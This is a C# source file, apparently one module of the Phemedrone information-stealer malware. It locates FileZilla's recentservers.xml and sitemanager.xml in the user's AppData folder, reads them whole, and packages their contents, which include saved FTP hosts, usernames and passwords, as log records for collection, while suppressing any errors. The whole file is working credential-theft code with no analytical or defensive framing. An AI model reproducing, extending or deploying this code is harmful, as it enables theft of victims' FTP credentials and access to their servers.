using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class FileZilla : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;
        protected override string GetServiceName() => "FileZilla";
        
        private static readonly string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            try
            {
                AddFile(Appdata + "FileZilla\\recentservers.xml");
                AddFile(Appdata + "FileZilla\\sitemanager.xml");
            }
            catch
            {
                // ignored
            }
            void AddFile(string fullPath)
            {
                var content = NullableValue.Call(() => File.ReadAllBytes(fullPath));
                if (content == null) return;
                var path = Appdata + "FileZilla\\";
                array.Add(new LogRecord
                {
                    Path = "FTP/" + fullPath.Replace(path, null),
                    Content = content
                });
            }
            return array.ToArray();
        }
        
    }
}